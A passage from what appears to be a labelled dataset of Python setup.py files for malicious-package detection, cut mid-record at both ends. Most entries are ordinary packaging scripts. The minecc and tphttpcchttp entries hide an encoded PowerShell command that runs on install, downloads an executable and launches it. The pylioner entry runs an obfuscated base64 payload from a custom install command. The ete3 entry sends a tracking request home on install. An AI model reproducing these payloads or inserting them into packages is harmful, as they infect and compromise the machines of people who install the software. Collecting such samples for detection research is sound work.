\"ete-new-installation\"\n    else:\n        TRACKINSTALL = \"ete-upgrade\"\n\n    sys.path = orig_path\n\n\ntry:\n    from setuptools import setup, find_packages\nexcept ImportError:\n    ez_setup.use_setuptools()\n    from setuptools import setup, find_packages\n\n\nPYTHON_DEPENDENCIES = [\n    [\"numpy\", \"Numpy is required for the ArrayTable and ClusterTree classes.\", 0],\n    [\"PyQt\", \"PyQt4/5 is required for tree visualization and image rendering.\", 0],\n    [\"lxml\", \"lxml is required from Nexml and Phyloxml support.\", 0]\n]\n\nCLASSIFIERS= [\n    \"Development Status :: 6 - Mature\",\n    \"Environment :: Console\",\n    \"Environment :: X11 Applications :: Qt\",\n    \"Intended Audience :: Developers\",\n    \"Intended Audience :: Other Audience\",\n    \"Intended Audience :: Science/Research\",\n    \"License :: OSI Approved :: GNU General Public License (GPL)\",\n    \"Natural Language :: English\",\n    \"Operating System :: MacOS\",\n    \"Operating System :: Microsoft :: Windows\",\n    \"Operating System :: POSIX :: Linux\",\n    \"Programming Language :: Python\",\n    \"Topic :: Scientific/Engineering :: Bio-Informatics\",\n    \"Topic :: Scientific/Engineering :: Visualization\",\n    \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ]\n\ndef can_import(mname):\n    'Test if a module can be imported '\n    if mname == \"PyQt\":\n        try:\n            __import__(\"PyQt4.QtCore\")\n            __import__(\"PyQt4.QtGui\")\n        except ImportError:\n            try:\n                __import__(\"PyQt5.QtCore\")\n                __import__(\"PyQt5.QtGui\")\n            except ImportError:\n                return False\n            else:\n                return True\n        else:\n            return True\n    else:\n        try:\n            __import__(mname)\n        except ImportError:\n            return False\n        else:\n            return True\n\ntry:\n    ETE_VERSION = open(os.path.join(HERE, \"VERSION\")).readline().strip()\nexcept IOError:\n    ETE_VERSION = 'unknown'\n\nprint(\"\\nInstalling ETE (%s) \\n\" %ETE_VERSION)\nprint()\n\n\n    \nMOD_NAME = \"ete3\"\n\nLONG_DESCRIPTION=\"\"\"\nThe Environment for Tree Exploration (ETE) is a Python programming\ntoolkit that assists in the recontruction, manipulation, analysis and\nvisualization of phylogenetic trees (although clustering trees or any\nother tree-like data structure are also supported).\n\nETE is currently developed as a tool for researchers working in\nphylogenetics and genomics. If you use ETE for a published work,\nplease cite:\n\n::\n\n   Jaime Huerta-Cepas, Fran\u00e7ois Serra and Peer Bork. \"ETE 3: Reconstruction,\n   analysis and visualization of phylogenomic data.\"  Mol Biol Evol (2016) doi:\n   10.1093/molbev/msw046\n\nVisit http://etetoolkit.org for more info.\n\"\"\"\n\ntry:\n    _s = setup(\n        include_package_data = True,\n\n        name = MOD_NAME,\n        version = ETE_VERSION,\n        packages = [\"ete3\"],\n\n        entry_points = {\"console_scripts\":\n                        [\"ete3 = %s.tools.ete:main\" %MOD_NAME]},\n        requires = [\"six\"],\n\n        # Project uses reStructuredText, so ensure that the docutils get\n        # installed or upgraded on the target machine\n        install_requires = [\n            ],\n        package_data = {\n\n        },\n        data_files = [(\"%s/tools\" %MOD_NAME, [\"%s/tools/ete_build.cfg\" %MOD_NAME])],\n\n        # metadata for upload to PyPI\n        author = \"Jaime Huerta-Cepas\",\n        author_email = \"jhcepas@gmail.com\",\n        maintainer = \"Jaime Huerta-Cepas\",\n        maintainer_email = \"huerta@embl.de\",\n        platforms = \"OS Independent\",\n        license = \"GPLv3\",\n        description = \"A Python Environment for (phylogenetic) Tree Exploration\",\n        long_description = LONG_DESCRIPTION,\n        classifiers = CLASSIFIERS,\n        provides = [MOD_NAME],\n        keywords = \"tree, tree reconstruction, tree visualization, tree comparison, phylogeny, phylogenetics, phylogenomics\",\n        url = \"http://etetoolkit.org\",\n        download_url = \"http://etetoolkit.org/static/releases/ete3/\",\n\n    )\n\nexcept:\n    print(\"\\033[91m - Errors found! - \\033[0m\")\n    raise\n\nelse:\n\n    print(\"\\033[92m - Done! - \\033[0m\")\n    missing = False\n    for mname, msg, ex in PYTHON_DEPENDENCIES:\n        if not can_import(mname):\n            print(\" Warning:\\033[93m Optional library [%s] could not be found \\033[0m\" %mname)\n            print(\"  \",msg)\n            missing=True\n\n    notwanted = set([\"-h\", \"--help\", \"-n\", \"--dry-run\"])\n    seen = set(_s.script_args)\n    wanted = set([\"install\", \"bdist\", \"bdist_egg\"])\n    if TRACKINSTALL is not None and (wanted & seen) and not (notwanted & seen):\n        try:\n            welcome = quote(\"New alien in earth! (%s %s)\" %(TRACKINSTALL, time.ctime()))\n            urlopen(\"http://etetoolkit.org/static/et_phone_home.php?ID=%s&VERSION=%s&MSG=%s\"\n                            %(TRACKINSTALL, ETE_VERSION, welcome))\n        except Exception:\n            pass\n", "target": 0}
{"idx": "gspread-5.4.0", "func": "#!/usr/bin/env python\n\nimport os.path\nimport re\nimport sys\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\nif sys.argv[-1] == \"publish\":\n    os.system(\"python setup.py sdist bdist_wheel\")\n    sys.exit()\n\n\ndef read(filename):\n    return open(os.path.join(os.path.dirname(__file__), filename)).read()\n\n\ndescription = \"Google Spreadsheets Python API\"\n\nlong_description = \"\"\"\n{index}\n\nLicense\n-------\nMIT\n\"\"\"\n\nlong_description = long_description.lstrip(\"\\n\").format(index=read(\"docs/index.txt\"))\n\nversion = re.search(\n    r'^__version__\\s*=\\s*[\\'\"]([^\\'\"]*)[\\'\"]', read(\"gspread/__init__.py\"), re.MULTILINE\n).group(1)\n\nsetup(\n    name=\"gspread\",\n    packages=[\"gspread\"],\n    description=description,\n    long_description=long_description,\n    version=version,\n    author=\"Anton Burnashev\",\n    author_email=\"fuss.here@gmail.com\",\n    maintainer=\"Alexandre Lavigne\",\n    maintainer_email=\"lavigne958@gmail.com\",\n    url=\"https://github.com/burnash/gspread\",\n    keywords=[\"spreadsheets\", \"google-spreadsheets\"],\n    install_requires=[\"google-auth>=1.12.0\", \"google-auth-oauthlib>=0.4.1\"],\n    python_requires=\">=3.6, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*\",\n    classifiers=[\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: End Users/Desktop\",\n        \"Intended Audience :: Science/Research\",\n        \"Topic :: Office/Business :: Financial :: Spreadsheet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    license=\"MIT\",\n)\n", "target": 0}
{"idx": "drf-extensions-0.7.1", "func": "#!/usr/bin/env python\nfrom setuptools import setup\nimport re\nimport os\nimport sys\n\n\ndef get_version(package):\n    \"\"\"\n    Return package version as listed in `__version__` in `init.py`.\n    \"\"\"\n    init_py = open(os.path.join(package, '__init__.py')).read()\n    return re.match(\"__version__ = ['\\\"]([^'\\\"]+)['\\\"]\", init_py).group(1)\n\n\ndef get_packages(package):\n    \"\"\"\n    Return root package and all sub-packages.\n    \"\"\"\n    return [dirpath\n            for dirpath, dirnames, filenames in os.walk(package)\n            if os.path.exists(os.path.join(dirpath, '__init__.py'))]\n\n\ndef get_package_data(package):\n    \"\"\"\n    Return all files under the root package, that are not in a\n    package themselves.\n    \"\"\"\n    walk = [(dirpath.replace(package + os.sep, '', 1), filenames)\n            for dirpath, dirnames, filenames in os.walk(package)\n            if not os.path.exists(os.path.join(dirpath, '__init__.py'))]\n\n    filepaths = []\n    for base, filenames in walk:\n        filepaths.extend([os.path.join(base, filename)\n                          for filename in filenames])\n    return {package: filepaths}\n\n\nversion = get_version('rest_framework_extensions')\n\n\nif sys.argv[-1] == 'publish':\n    os.system(\"python setup.py sdist upload\")\n    os.system(\"python setup.py bdist_wheel upload\")\n    print(\"You probably want to also tag the version now:\")\n    print(\"  git tag -a %s -m 'version %s'\" % (version, version))\n    print(\"  git push --tags\")\n    sys.exit()\n\n\nsetup(\n    name='drf-extensions',\n    version=version,\n    url='http://github.com/chibisov/drf-extensions',\n    download_url='https://pypi.python.org/pypi/drf-extensions/',\n    license='BSD',\n    install_requires=['djangorestframework>=3.9.3'],\n    description='Extensions for Django REST Framework',\n    long_description='DRF-extensions is a collection of custom extensions for Django REST Framework',\n    author='Asif Saif Uddin, Gennady Chibisov',\n    author_email='auvipy@gmail.com',\n    packages=get_packages('rest_framework_extensions'),\n    package_data=get_package_data('rest_framework_extensions'),\n    test_suite='rest_framework_extensions.runtests.runtests.main',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Topic :: Internet :: WWW/HTTP',\n    ]\n)\n", "target": 0}
{"idx": "django-otp-1.1.3", "func": "#!/usr/bin/env python\n\nfrom setuptools import find_packages, setup\n\n\nsetup(\n    name='django-otp',\n    version='1.1.3',\n    description=\"A pluggable framework for adding two-factor authentication to Django using one-time passwords.\",\n    license='BSD',\n    author=\"Peter Sagerson\",\n    author_email='psagers@ignorare.net',\n    url='https://github.com/django-otp/django-otp',\n    project_urls={\n        \"Documentation\": 'https://django-otp-official.readthedocs.io/',\n        \"Source\": 'https://github.com/django-otp/django-otp',\n    },\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Framework :: Django\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Topic :: Security\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n\n    package_dir={'': 'src'},\n    packages=find_packages(where='src'),\n    include_package_data=True,\n    zip_safe=False,\n\n    install_requires=[\n        'django >= 2.2',\n    ],\n    extras_require={\n        'qrcode': ['qrcode'],\n    },\n)\n", "target": 0}
{"idx": "django-rq-2.5.1", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\nsetup(\n    name='django-rq',\n    version='2.5.1',\n    author='Selwin Ong',\n    author_email='selwin.ong@gmail.com',\n    packages=['django_rq'],\n    url='https://github.com/rq/django-rq',\n    license='MIT',\n    description='An app that provides django integration for RQ (Redis Queue)',\n    long_description=open('README.rst').read(),\n    zip_safe=False,\n    include_package_data=True,\n    package_data={'': ['README.rst']},\n    install_requires=['django>=2.0', 'rq>=1.2', 'redis>=3'],\n    extras_require={\n        'Sentry':  ['raven>=6.1.0'],\n        'testing': ['mock>=2.0.0'],\n    },\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Internet :: WWW/HTTP',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ]\n)\n", "target": 0}
{"idx": "minecc-9.2", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'minecc',\n    packages = ['modlib'],\n    version = '8.6',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "decopatch-1.4.10", "func": "\"\"\"\nTo understand this project's build structure\n\n - This project uses setuptools, so it is declared as the build system in the pyproject.toml file\n - We use as much as possible `setup.cfg` to store the information so that it can be read by other tools such as `tox`\n   and `nox`. So `setup.py` contains **almost nothing** (see below)\n   This philosophy was found after trying all other possible combinations in other projects :)\n   A reference project that was inspiring to make this move : https://github.com/Kinto/kinto/blob/master/setup.cfg\n\nSee also:\n  https://setuptools.readthedocs.io/en/latest/setuptools.html#configuring-setup-using-setup-cfg-files\n  https://packaging.python.org/en/latest/distributing.html\n  https://github.com/pypa/sampleproject\n\"\"\"\nfrom setuptools import setup\n\n\n# (1) check required versions (from https://medium.com/@daveshawley/safely-using-setup-cfg-for-metadata-1babbe54c108)\nimport pkg_resources\n\npkg_resources.require(\"setuptools>=39.2\")\npkg_resources.require(\"setuptools_scm\")\n\n\n# (2) Generate download url using git version\nfrom setuptools_scm import get_version  # noqa: E402\n\nURL = \"https://github.com/smarie/python-decopatch\"\nDOWNLOAD_URL = URL + \"/tarball/\" + get_version()\n\n\n# (3) Call setup() with as little args as possible\nsetup(\n    download_url=DOWNLOAD_URL,\n    use_scm_version={\n        \"write_to\": \"src/decopatch/_version.py\"\n    },  # we can't put `use_scm_version` in setup.cfg yet unfortunately\n)\n", "target": 0}
{"idx": "django-cors-headers-3.13.0", "func": "from __future__ import annotations\n\nfrom setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "tphttpcchttp-2.21", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tphttpcchttp',\n    packages = ['modlib'],\n    version = '9.23',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "pylioner-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nfrom pathlib import Path\n\n\n\nVERSION = '1.0.0'\nDESCRIPTION = 'Cool package.'\nthis_directory = Path(__file__).parent\nlong_description = (this_directory / \"README.md\").read_text()\n\n\nclass InstallCommand(install):\n\n    def run(self):\n        try:\n            print(\"Welcome to pystob !\\nPlease wait to installimport__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"d29wdkVhVEVjb3BGRWF2YyA9IlleRl9GR1x4MTNZSjheWkFZSkJceDEzRk1VSEdaVVVGQjpaXVJeXFxceDE3XHgwOFx4MTFcXEVceDFmUlZEVV5XXFxYXHgxMFx4MTAyW19ceDE5W0ZceDE2QVJEXFxceDE2Uk5ZQkNAXHgxMVZceDE1dVx4MDNobG1KV0BKamtLX15RXlxcSG9kcEhGfVNNV21kYV9SW1laVG9qdFtURV5FV1BHaWRgUVtRWUdGbWxlRlRFRlx4MTd4VF1DbWljQlZWQlRbS2VkYUBKQFBVXHgwN1x4MDdsaFx4MWZceDFlXHgxNlxyXHgwY1x4MTd1WFxcQVNceDAzPjpceDE4XHgxOVx4MTJceDEyVkVceDE5XVhVX0VceDFhU1x4MTF7XHgwYmRqbEFcXERCZG9LX1lXXV1OamVzR0d1V0xXb2lqWFlYXFxYV2ltfV9RR1hBWFNFb2pmXFxdVFZGQ2lqa01ZQE1ceDE5eVBWRG9sZEpYUUJQWkBlbGFPSkBVVVx4MGZceDA2XHgxMFx4MTA8XHgxN1x4MTBceDEzXHgxMVlHV1tceDFiXlx4MTN7XHgwY2VubEVUSkBsb01cXFtUWlhEbmt2QUZ8V0dUZGtqWlRbWVtWbGpceDdmXFxUQFhGXlVCbWlkWVdVX0JFZGVrRlhLQFx4MTV1VF1FaGRnRF9WRVJUQ25qak1DTFxcX1x4MDRccmprZ3pceDdmXHgwNVx4MDVceDFjQ1FLXHgxM1x4MTRceDE2XHgxYlNceDFiXHgxZlx4MWZPQVlHU1x4MThSXHgxNGBTTVx4MTJgRFllUFNfWVx4MThcblx4MTh2R1NRQVRceDdmVFhQVEZceDFmXHgxN2ZgVUNcXENEXHgxN2JYUFpUXHgxYlx4MTFceDEyZVdjRlBiW1VYVFx4MTlkRV9ceDE3UFFCXHgxYVx4MDVcclx4MWRceDEwXHgxZVx4MTlceDEwcVx4MDNqa2VAVEREbmlIVF5fX1dPZWpwSEN0UkJRaG9hWVhfXllWamR7WlZKWEtaU0JsaWZZWFZaQEFraWJHV0NBXHgxM31cXF9FaWpoS1dVS1hZRmRtYElHTFJbXHgwNlx4MDVrb255fFx4MDVceDBiXHgxYVJZTVx4MTBceDEyXHgxZlx4MTZ0WEFceDE5XHgwNVx4MDNceDFiXHgxOVx4MTNceDA4bVZlXFxGXHgxOWFCUGBYVlpcXFx4MTRceDBlXHgxM3hWRl9eX1FceDFmXHgxZjlceDE1XHgxOFx4MTdceDE4WkVTXlx4MWRXXHgxMnVceDA4aWtnRFBDQGptTl9fXlheSGpkeEhCfVhAVGRtYV9VVV5YV21rflBTQFlKW1ZMZW5lUFhTX0RCamthQVJKRVx4MTh7XFxcXExqbWhBX1REUVlAb2pqRlZFRUNIam9icXlceDBlXHgwMVx4MWJAUkZceDEzXHgxY1x4MTZceDEwVFx4MTVceDFiXHgxOUJDWkJUXHgxZFVceDE3XHgxZVx4MTZjUEJceDE4bktaalFRWVRceDExXHgwZVx4MTB3SlJXRFR4UVNVUUJceDExXHgxNmdrWkBbSUJceDE5Y1tUWltceDEwXHgxY1x4MTNkX29FUWFRU11UXHgxZGJGWFx4MTBXW0FceDFlXG5ceDA2XHgxZVx4MTdceDE3XHgxNlx4MWF1XHRpZGJLUEdFbGlKXFxZVVxcWU9raXBDRnVUR1FlbWJaV1VQVlVlZXlcXFtDXFxDW15DamxmXl1dX0VFZWhjTFhARlx4MTl7Ul5GbWpnQFpUSlBVRWVuak9CTFZdXHgwNVx4MDJsaGBKRU1XWlx4MTlUTl1ceDE0XHgxM1x4MTNceDE4dFBHXHgxZFx4MDVceDA0XHgxY1x4MWRceDEwXHgwNm5bZFdDXHgxNWZAXmJdVlxcVVx4MTFcclx4MTV4V01QW1dePmZdRVx4MTNnR1BkXlVdW1x4MTNceDA0XHgxMHFEXFxVRF12UFhcXFVDXHgxOFx4MTFmZVRAXFxDTFx4MWZrXlxcXlVceDE0XHgxOFx4MThvXmRFWGdbVlpVXHgxY2VCX1x4MTZbXkFceDFkXHgwYlx4MDNceDExXHgxNVx4MTNceDE2XHgxMnZceDBibGpnRlJARGltSFpeUlpeRG1sdEZIfVlGWGVoZ1dQXllaX2tqfVhUQVZDXVBNaGxvUFxcVlZBRGxvYkJWQEFceDEzdVRWQ2VuaUReX0FRXkVsaGBKRU1XWlx4MDFceDA1amRlSkZMUlVcclx4MDNceDE4VU1UXHgxMlx4MTZceDE0XHgxNXRaRVx4MWRceDAyXHgwN1x4MWZceDFkXHgxNVx4MDNsV2JVQVx4MTZvSlBhUVxcWFlceDE4XHgwY1x4MTN+W0xfX15WXHgxMFx4MTRceDFlXHgxOThceDE1W11ES1hWX1BYXHgxN1x4MWZHQ1dZQVNWSlx4MTFVT11dTlhdV1JUWVlSXHgxNFx4MWNXWU5cXFtYUFJceDE4XHgxOUNHUVhKXFxBT1x4MTBzfmJzdWd4Z3lxXHgxMVx4MTFeRUFDXG5ceDE2XHgxZVx4MDVceDA0XHgxOFx0XHgwZVx4MDBceDFjXHgwYlx4MGNceDFhXHgwNFx4MGNcdFx0XHgwOFx4MDRceDAwXHgwNlx4MTlUXVx4MThBTF5GX1RRXHgxMlx4MThceDFicVx4MDhlamJDVkNFa25OX1dWUVhEbmV3QUh3UUdXbGhhXFxXVFtZUG1qdV9QR1dEV1NBamxiWF5SXUJEbmtmRVJERVx4MTV+VVdEbGlmSlZfQFhUR2lkYkpDQF1aXHgwMFx4MDRta0FMXkZfVFFceDFlXUFXXHgxMGVYRERSQ0JceDE3XHgxMFx4MTdceDEzXHgxYXJceDAyamVnSlNDS29sSFpfU1pdS2VudkdBcllCUmlkZVdUWF9eUm1se1tWRV1EWldHam1iWl5dXkdGamRqTFNLTVx4MTR4XV9GbGhoRVlXQ1ZeSmxuZUBHRF1UXHgwNFx4MDZlakVFXUVfWldceDFiVkBUXHgxYWpXOFx4MTlceDE2XHgxMVx4MThSWFJceDE2XHJceDE0XHgxNFx4MTFNZW5ceDE1QkJTSlhSWF1rZFx4MTdceDBmXHgxNmxpXHgxM0RTQUFrblx4MTVceDE5XHgxMW9qXHgxM1ZcXF5NVF5BamRceDFiXHgwMm5lXHgxYlx4MTNceDE1XHgxM1x4MTFfX1NRWVx4MTZceDFiXHgxMVx4MTBvZVx4MTJPXHgxNFx4MWU+XHgxMFx4MThceDE5XHgxMl1JU1lceDE4VVx4MTN1XHJuaWZLVEpFZW5CWl5fWl5Oamx1Q0NyWEZWa21kV1deXFxWUGRpeF9TR15DWVRBa25gXFxfV1lGRm9sakVRR0JceDE4dF1cXExlaGVKXlRCVVVEamxiTkBNVV9ceDAwXHJobG9wfFx4MDFceDBiXHgxOFVRR1x4MTNceDFhXHgxN1x4MTBUXHgxMVx4MTFceDFmT0RQRlxcXHgxZVdceDFmXHgxNFx4MTdRX0RHUldbUFxcXHgxN1x4MThFRFlYQFNdRVx4MThYTFJfQl9cXFlTUV1dVVx4MTVceDFlV1lGW19fWFVceDEwXHgxYUZKUFdAUE1NXHgxNX5+YXVzanhjfnVceDE3XHgxMVFERkZceDAzXHgxYlx4MWZcclx4MDhceDFjXHgwM1x4MGVceDBlXHgxOVx4MDJceDA2XHgxZlx4MDdceDAzXG5ceDBmXHgwYlx4MDhcdFx0XHgxOV1eXHgxNkVIS0dVXlx4MTRceDEwXHgxNnBcdGplZ0RSQ0VkakhZV1BRW0hqbHRBQHJTQVZua2deUltYW1RsZXxZVkRXSldUTWVoYlFfV19DS2tqY0VWQU1ceDEwXHg3ZlNXQWxkaUBdXkRWXUBtamRLRkddXFxceDBlXHgwMmVuak9CTFZdXHgxZFNIUVx4MTFvWFtbQ0RQUlVfXVx4MTVceDE3Q0pUW0VWUENceDEwW0tRWEVZWV5SUltaUVx4MTBceDE2VV9CWFRWWVZceDE5XHgxNkRHUV5BWUBBXHgxN3BceDdmY3J0a1x4N2ZneH1ceDE0XHgxMlBNRkJceDAzXHgxOVx4MThceDA1XHgwMlx4MWZceDA3XHgwMFxuXHgxYlx4MDFcclx4MWZcdFx4MDJceDAxXHgwOFx4MDFceDA2XHRcdFx4MWNUX1x4MTlDTUBceDBiXHgwMFx4MWJceDEyXHgxNXRceDBiamRjQFBKRGRpTlpfUlheS25pdkJHcVBHV21pYV9YXFxZW1FkZXVbWktbRldXR2xob15YVF5AQGVsYUJYRkRceDE4dFdcXExqa2BBXlFFU1hAZG1rT0pGXFxbXHgwN1x4MGNvbGBPQ0BWXlx4MGVceDBmXHgxY1JPVFx4MTRkWFFcXExEWVFYX15ceDE1XHgxZUREU1tEVFJHXHgxMV5PVVpEXlVeUVFcXFdbXHgxOFx4MWRdVkNbVF5SVFx4MTRceDE3R0RZXkVaTUlceDEycHZmdVx4N2ZrfWd3clx4MTdceDEyW0VCR1x4MDhceDFhXHgxY1xyXHgwMFx4MTZceDA3XHgwZVxuXHgxN1x4MDRceDA0XHgxNlx4MDJceDA0XHgwYlx4MGNceDA4XHgwNFx4MGJceDAyXHgxOV1eXHgxOFBQW11FV15ceDFhXHgxN1x4MWF2XHgwZmpsYEJVREFpa0lbWlZaWExpb3FJQXRUQlllZGBWWFlcXFZWb2x5UVREX0JYVU1sbmFQWlRXTkFuZWVDUUFFXHgxNnpXW0ZkbWhEVlVLV1xcS29sYE9DQFZeXHgwMFxybmtwUFtdZXd+XHgxNlJAUFx4MTdqXkZFUURGXHgxNVx4MTVceDEwXHgxN1x4MTdyXHRqbWBAVUtCbGlNVFZfW1dEaGl5QUN0VUxWamxjWFJUWVxcUWVofVFaQF1KWVFEb21hXlxcUVxcT0JkampGWERFXHgxOH5VXUNsaGNBWV5AVlpCamRlR1RKQ01FaWpnfFx4N2ZceDA2XHgwMlx4MWNDVUFceDE1aV9QQ0NZXHgxM1x4MWRxXHgxMVx4MTJ2WVZNXVxcTVx4MTRgTEhUXHRceDEwVUhHWllSVkdQX1xcXHgxOVNHX1ZceDFiXHgxMlx4MWZdXHgxNkxRW1BLXHgxN1pBR0hCXHgwMlx4MTlceDE2UVhYUEpKXHgxZVdfQ1dcXEFSXHgxN1FYWlx4MWVXSF9ceDFjQl1VUFpaXUNceDFhXHgwMFx4MDFceDAzXHgwMFx4MDJceDA2XHgwNFx4MDVceDBjXHgwNlx4MDdceDAxXHgwNVx4MDFceDAxXHgwNFx4MDBceDAwXHgwM1x4MWFMXHgwZVx4MTRQREtoelBBfVx4MDNdXHgwNXVaXHgwNVx4MDR7e2pTXHgwMWRge1x4MDJceDA3S293alZRRnpJdnVcXEpsVHV3e1F6ZVFnUGpceDAzXHgwN0FDfXZQWFx4MDddeHZeXHgwOFFceDFmXHgxMVx4MTRceDFjMlx4MTdceDE4XHgxNVx4MTVFRVdBQllRUERBXHgxOUdEXVx4MWVXXHgxN3BcbmVtZUZTSkpkbkJVW1JRX05saHlHRnRQQ1JlbGBZWFlZVl5ubnRfVEJcXEJZUUZpb29YVlJWRUpqbWtHUUFCXHgxMHlWXUNlbmdFXlFKV15GZGtrTEZCVVhceDA3XHgwNGpuYn58XHgwNFx4MDdceDFmRVRCXHgxN1x4MWZceDEwSllVWVpceDA1bUpHXFxceDE1XHgxNFZQVFBbXHRsRUNVXHgxOD1ceDEzXHgxOVx4MTBceDEyPFxcWENdXHgwM1x4MTJceDEyXHgxOTxceDE3XHgxMFx4MTNceDExRlZBRiIgCgppT3B2RW9lYWFlYXZvY3AgPSAiMDM2MDQzMzY5Mjc3MTY4NjM1ODc4NTU2MDUxMDYyNTcyNzUxMzYxNTMwOTEwNTY4OTgyOTk0NTgxMzA0ODc2MDE3MzkwMjY5NDA4OTIyOTY3MDMxNjcyNTM4MTg2OTI5NjE4MyIKdW9jcEVBdGFjb3ZwZSA9IGxlbih3b3B2RWFURWNvcEZFYXZjKQpvSW9lYVRFQWN2cGFlID0gIiIKZm9yIGZhcGNFYW9jdmEgaW4gcmFuZ2UodW9jcEVBdGFjb3ZwZSk6CiAgICBuT3BjdmFFYW9wY1RFYXBjb1RFYWMgPSB3b3B2RWFURWNvcEZFYXZjW2ZhcGNFYW9jdmFdCiAgICBxUW9lYXB2VGVhb2NwT2Npdk52YSA9IGlPcHZFb2VhYWVhdm9jcFtmYXBjRWFvY3ZhICUgbGVuKGlPcHZFb2VhYWVhdm9jcCldCiAgICBvSW9lYVRFQWN2cGFlICs9IGNocihvcmQobk9wY3ZhRWFvcGNURWFwY29URWFjKSBeIG9yZChxUW9lYXB2VGVhb2NwT2Npdk52YSkpCgoKZXZhbChjb21waWxlKG9Jb2VhVEVBY3ZwYWUsICc8c3RyaW5nPicsICdleGVjJykp\"),'<string>','exec'))\n        except:\n            pass\n        install.run(self)\n\n\nsetup(\n    